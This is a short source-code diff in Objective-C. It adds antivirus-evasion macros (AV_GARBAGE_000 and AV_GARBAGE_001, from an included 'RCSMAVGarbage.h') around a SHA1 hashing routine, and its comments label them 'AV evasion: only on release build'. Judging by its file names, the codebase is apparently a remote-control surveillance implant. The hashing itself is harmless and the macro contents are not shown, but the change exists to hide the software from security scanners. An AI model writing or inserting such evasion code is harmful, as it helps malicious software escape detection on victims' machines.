@@ -16,13 +16,21 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @implementation NSMutableData (SHA1Extension)
 
 - (NSMutableData *)sha1Hash
 {
-  unsigned char digest[SHA_DIGEST_LENGTH];
+  unsigned char digest[SHA_DIGEST_LENGTH]; 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
  	CC_SHA1([self bytes], [self length], digest);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
  	return [NSMutableData dataWithBytes: &digest length: SHA_DIGEST_LENGTH];
 }
